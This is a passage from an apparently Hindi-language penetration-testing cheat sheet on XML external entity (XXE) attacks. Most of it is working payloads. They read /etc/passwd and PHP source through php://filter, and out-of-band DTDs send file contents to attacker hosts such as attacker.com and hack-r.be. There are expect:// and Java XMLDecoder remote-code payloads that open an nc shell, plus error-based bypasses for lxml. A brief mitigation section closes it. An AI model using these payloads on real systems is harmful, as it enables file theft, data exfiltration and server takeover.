आप यहाँ \[**"Encode Recipe**" of cyberchef] \(\[[https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to) को UTF-7 में परिवर्तित करने के लिए उपयोग कर सकते हैं।
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

यदि वेब PHP का उपयोग कर रहा है, तो `file:/` का उपयोग करने के बजाय आप **php wrappers**`php://filter/convert.base64-encode/resource=` का उपयोग करके **आंतरिक फ़ाइलों** तक पहुँच सकते हैं।

यदि वेब Java का उपयोग कर रहा है, तो आप [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol) की जांच कर सकते हैं।

### HTML Entities

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) से ट्रिक\
आप एक **entity inside an entity** बना सकते हैं, इसे **html entities** के साथ एन्कोड करके और फिर इसे **dtd लोड** करने के लिए कॉल कर सकते हैं।\
ध्यान दें कि उपयोग की गई **HTML Entities** **संख्यात्मक** होनी चाहिए (जैसे \[इस उदाहरण में]\([https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD उदाहरण:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Extract** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **बाहरी संसाधन निकालें**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**यदि PHP "expect" मॉड्यूल लोड किया गया है**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

यह उदाहरण [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) से प्रेरित है।

XLIFF (XML Localization Interchange File Format) का उपयोग स्थानीयकरण प्रक्रियाओं में डेटा विनिमय को मानकीकृत करने के लिए किया जाता है। यह एक XML-आधारित प्रारूप है जिसका मुख्य रूप से स्थानीयकरण के दौरान उपकरणों के बीच स्थानीयकरण योग्य डेटा को स्थानांतरित करने और CAT (Computer-Aided Translation) उपकरणों के लिए एक सामान्य विनिमय प्रारूप के रूप में उपयोग किया जाता है।

### Blind Request Analysis

सर्वर को निम्नलिखित सामग्री के साथ एक अनुरोध किया जाता है:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
हालांकि, यह अनुरोध एक आंतरिक सर्वर त्रुटि को सक्रिय करता है, विशेष रूप से मार्कअप घोषणाओं के साथ एक समस्या का उल्लेख करते हुए:
```json
{
"status": 500,
"error": "Internal Server Error",
"message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```
हालांकि त्रुटि है, एक हिट बर्प सहयोगी पर दर्ज की जाती है, जो बाहरी इकाई के साथ कुछ स्तर की बातचीत को इंगित करती है।

Out of Band Data Exfiltration डेटा को एक्सफिल्ट्रेट करने के लिए, एक संशोधित अनुरोध भेजा जाता है:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
यह दृष्टिकोण यह प्रकट करता है कि User Agent Java 1.8 के उपयोग को इंगित करता है। इस संस्करण के Java के साथ एक उल्लेखनीय सीमा यह है कि यह Out of Band तकनीक का उपयोग करके newline character वाले फ़ाइलों को पुनः प्राप्त करने में असमर्थ है, जैसे कि /etc/passwd।

Error-Based Data Exfiltration इस सीमा को पार करने के लिए, एक Error-Based दृष्टिकोण का उपयोग किया जाता है। DTD फ़ाइल को इस प्रकार संरचित किया गया है कि यह एक त्रुटि को ट्रिगर करता है जिसमें लक्षित फ़ाइल से डेटा शामिल होता है:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
सर्वर एक त्रुटि के साथ प्रतिक्रिया करता है, जो महत्वपूर्ण रूप से गैर-मौजूद फ़ाइल को दर्शाता है, यह संकेत करते हुए कि सर्वर निर्दिष्ट फ़ाइल तक पहुँचने का प्रयास कर रहा है:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
त्रुटि संदेश में फ़ाइल की सामग्री शामिल करने के लिए, DTD फ़ाइल को समायोजित किया जाता है:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
यह संशोधन फ़ाइल की सामग्री के सफल एक्सफिल्ट्रेशन की ओर ले जाता है, क्योंकि यह HTTP के माध्यम से भेजे गए त्रुटि आउटपुट में परिलक्षित होता है। यह एक सफल XXE (XML External Entity) हमले को इंगित करता है, जो संवेदनशील जानकारी निकालने के लिए आउट ऑफ बैंड और त्रुटि-आधारित तकनीकों दोनों का लाभ उठाता है।

## RSS - XEE

XXE भेद्यता का लाभ उठाने के लिए RSS प्रारूप के साथ मान्य XML।

### Ping back

हमलावर के सर्वर के लिए सरल HTTP अनुरोध
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### फ़ाइल पढ़ें
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### स्रोत कोड पढ़ें

PHP base64 फ़िल्टर का उपयोग करना
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder एक Java क्लास है जो XML संदेश के आधार पर ऑब्जेक्ट बनाती है। यदि एक दुर्भावनापूर्ण उपयोगकर्ता किसी एप्लिकेशन को **readObject** मेथड में मनमाना डेटा उपयोग करने के लिए मजबूर कर सकता है, तो वह तुरंत सर्वर पर कोड निष्पादन प्राप्त कर लेगा।

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## XXE + WrapWrap + Lightyear + bypasses

इस अद्भुत रिपोर्ट को देखें [https://swarm.ptsecurity.com/impossible-xxe-in-php/](https://swarm.ptsecurity.com/impossible-xxe-in-php/)

## Tools

{{#ref}}
https://github.com/luisfontes19/xxexploiter
{{#endref}}

### Python lxml Parameter-Entity XXE (Error-Based File Disclosure)

> [!INFO]
> Python लाइब्रेरी **lxml** के पीछे **libxml2** का उपयोग होता है। **lxml 5.4.0 / libxml2 2.13.8** से पहले के संस्करण *parameter* entities को तब भी विस्तारित करते हैं जब `resolve_entities=False` हो, जिससे वे तब भी पहुंच योग्य होते हैं जब एप्लिकेशन `load_dtd=True` और/या `resolve_entities=True` सक्षम करता है। यह Error-Based XXE payloads को अनुमति देता है जो स्थानीय फ़ाइलों की सामग्री को पार्सर त्रुटि संदेश में एम्बेड करते हैं।

#### 1. lxml < 5.4.0 का शोषण करना
1. एक *स्थानीय* DTD की पहचान करें या बनाएँ जो एक **undefined** parameter entity को परिभाषित करता है (जैसे `%config_hex;`)।
2. एक आंतरिक DTD तैयार करें जो:
* स्थानीय DTD को `<!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">` के साथ लोड करता है।
* undefined entity को फिर से परिभाषित करता है ताकि यह:
- लक्षित फ़ाइल को पढ़े (`<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">`)।
- एक और parameter entity बनाए जो एक **invalid path** को संदर्भित करता है जिसमें `%flag;` मान होता है और एक पार्सर त्रुटि को ट्रिगर करता है (`<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">`)।
3. अंततः `%local_dtd;` और `%eval;` को विस्तारित करें ताकि पार्सर `%error;` का सामना करे, `/aaa/<FLAG>` को खोलने में विफल हो और फेंकी गई अपवाद के अंदर ध्वज लीक हो जाए – जो अक्सर एप्लिकेशन द्वारा उपयोगकर्ता को वापस किया जाता है।
```xml
<!DOCTYPE colors [
<!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
<!ENTITY % config_hex '
<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">
%eval;'>
%local_dtd;
]>
```
जब एप्लिकेशन अपवाद को प्रिंट करता है, तो प्रतिक्रिया में शामिल होता है:
```
Error : failed to load external entity "file:///aaa/FLAG{secret}"
```
> [!TIP]
> यदि पार्सर आंतरिक उपसमुच्चय के अंदर `%`/`&` वर्णों के बारे में शिकायत करता है, तो उन्हें डबल-कोड करें (`&#x26;#x25;` ⇒ `%`) ताकि विस्तार में देरी हो सके।

#### 2. lxml 5.4.0 हार्डनिंग को बायपास करना (libxml2 अभी भी संवेदनशील)
`lxml` ≥ 5.4.0 *त्रुटि* पैरामीटर संस्थाओं जैसे ऊपर दिए गए को मना करता है, लेकिन **libxml2** अभी भी उन्हें *सामान्य* संस्था में एम्बेड करने की अनुमति देता है। चाल यह है:
1. फ़ाइल को एक पैरामीटर संस्था `%file` में पढ़ें।
2. एक और पैरामीटर संस्था घोषित करें जो एक **सामान्य** संस्था `c` बनाती है जिसका SYSTEM पहचानकर्ता एक *अवास्तविक प्रोटोकॉल* का उपयोग करता है जैसे `meow://%file;`।
3. XML शरीर में `&c;` रखें। जब पार्सर `meow://…` को डेरिफरेंस करने की कोशिश करता है, तो यह विफल हो जाता है और त्रुटि संदेश में पूर्ण URI – फ़ाइल सामग्री सहित – को दर्शाता है।
```xml
<!DOCTYPE colors [
<!ENTITY % a '
<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
<!ENTITY % b "<!ENTITY c SYSTEM 'meow://%file;'>">
'>
%a; %b;
]>
<colors>&c;</colors>
```
#### Key takeaways
* **Parameter entities** अभी भी libxml2 द्वारा विस्तारित होते हैं जब `resolve_entities` XXE को ब्लॉक करना चाहिए।
* एक **अमान्य URI** या **गैर-मौजूद फ़ाइल** नियंत्रित डेटा को फेंकी गई अपवाद में जोड़ने के लिए पर्याप्त है।
* यह तकनीक **बिना आउटबाउंड कनेक्टिविटी** के काम करती है, जिससे यह सख्त ईग्रेस-फिल्टर्ड वातावरण के लिए आदर्श बनती है।

#### Mitigation guidance
* **lxml ≥ 5.4.0** पर अपग्रेड करें और सुनिश्चित करें कि अंतर्निहित **libxml2** **≥ 2.13.8** है।
* `load_dtd` और/या `resolve_entities` को तब तक बंद करें जब तक कि यह बिल्कुल आवश्यक न हो।
* क्लाइंट को कच्चे पार्सर त्रुटियाँ लौटाने से बचें।

## References

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- Extract info via HTTP using own external DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

- [Dojo CTF Challenge #42 – Hex Color Palette XXE write-up](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-42)
- [lxml bug #2107279 – Parameter-entity XXE still possible](https://bugs.launchpad.net/lxml/+bug/2107279)

{{#include ../banners/hacktricks-training.md}}
